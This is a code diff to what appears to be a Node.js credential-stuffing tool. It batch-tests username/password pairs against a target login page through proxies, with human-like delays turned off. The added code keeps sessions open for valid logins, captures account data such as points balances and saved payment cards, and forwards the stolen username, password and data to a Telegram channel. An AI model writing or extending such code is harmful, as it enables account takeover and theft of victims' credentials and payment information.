@@ -14,7 +14,11 @@ const {
   boldV2,
   formatDurationMs,
   buildBatchFailed,
+  buildCheckAndCaptureResult,
 } = require('./messages');
+const { captureAccountData } = require('../automation/http/httpDataCapture');
+const { closeSession } = require('../automation/http/sessionManager');
+const { forwardValidToChannel } = require('./channelForwarder');
 const { createLogger } = require('../logger');
 const { getConfigService } = require('../shared/config/configService');
 
@@ -283,7 +287,7 @@ async function runCombineBatch(ctx, batch, options, helpers, checkCredentials) {
     let result;
     const credKey = cred._dedupeKey || makeKey(cred.username, cred.password);
     
-    for (let attempt = 0; attempt <= MAX_RETRIES; attempt++) {
+    for (let attempt = 0; attempt <= batchConfig.maxRetries; attempt++) {
       if (batchData.aborted) return;
       
       try {
@@ -292,14 +296,15 @@ async function runCombineBatch(ctx, batch, options, helpers, checkCredentials) {
           proxy: options.proxy,
           targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
           batchMode: true, // Skip human delays for faster batch processing
+          deferCloseOnValid: true, // Keep session open for capture/forwarding
         });
       } catch (err) {
         result = { status: 'ERROR', message: err.message };
       }
       
-      if (result.status !== 'ERROR' || attempt >= MAX_RETRIES) break;
+      if (result.status !== 'ERROR' || attempt >= batchConfig.maxRetries) break;
       
-      log.debug(`[combine-batch] Retry ${cred.username} (${attempt + 2}/${MAX_RETRIES + 1})`);
+      log.debug(`[combine-batch] Retry ${cred.username} (${attempt + 2}/${batchConfig.maxRetries + 1})`);
       await new Promise(r => setTimeout(r, (500 * Math.pow(2, attempt)) + Math.random() * 300));
     }
 
@@ -312,6 +317,25 @@ async function runCombineBatch(ctx, batch, options, helpers, checkCredentials) {
 
     if (result.status === 'VALID') {
       validCreds.push({ username: cred.username, password: cred.password });
+      
+      // Capture and forward to channel if session available
+      if (result.session) {
+        try {
+          const capture = await captureAccountData(result.session, { timeoutMs: options.timeoutMs || 60000 });
+          const message = buildCheckAndCaptureResult(result, capture, cred.username, 0, cred.password, result.ipAddress, null);
+          
+          // Forward to channel (non-blocking, don't fail batch on forward error)
+          forwardValidToChannel(ctx.telegram, cred.username, cred.password, message, capture).catch(err => {
+            log.debug(`[combine-batch] Forward failed: ${err.message}`);
+          });
+          
+          log.info(`[combine-batch] captured ${cred.username.slice(0,5)}***: points=${capture.points} cards=${capture.profile?.cards?.length || 0}`);
+        } catch (captureErr) {
+          log.warn(`[combine-batch] capture failed ${cred.username.slice(0,5)}***: ${captureErr.message}`);
+        } finally {
+          closeSession(result.session);
+        }
+      }
     }
 
     markProcessedStatus(credKey, result.status, batchConfig.processedTtlMs).catch(() => {});
